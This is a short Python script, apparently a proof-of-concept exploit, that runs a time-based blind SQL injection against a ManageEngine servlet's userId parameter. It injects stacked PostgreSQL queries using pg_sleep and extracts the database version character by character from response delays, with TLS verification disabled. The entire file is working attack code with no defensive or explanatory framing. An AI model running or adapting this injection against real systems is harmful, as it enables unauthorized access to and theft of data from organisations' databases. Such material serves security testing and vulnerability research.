import threading
import time 
import requests
from random import randint
from time import sleep

requests.packages.urllib3.disable_warnings()

def make_request(url, sql):
    start = time.time()
    r = requests.get( url % sql, verify=False)
    end = time.time()
    return end-start

for i in range(1,50):
    for j in range(65,122): 
        sql = f"select case when(ascii(substr(version(),{i},1))={j}) then pg_sleep(1) end"
        url = "https://manageengine:8443/servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;%s;--"
        total_time =make_request(url,sql)
        if total_time > 1:
            print("%s" % chr(j))
            break
    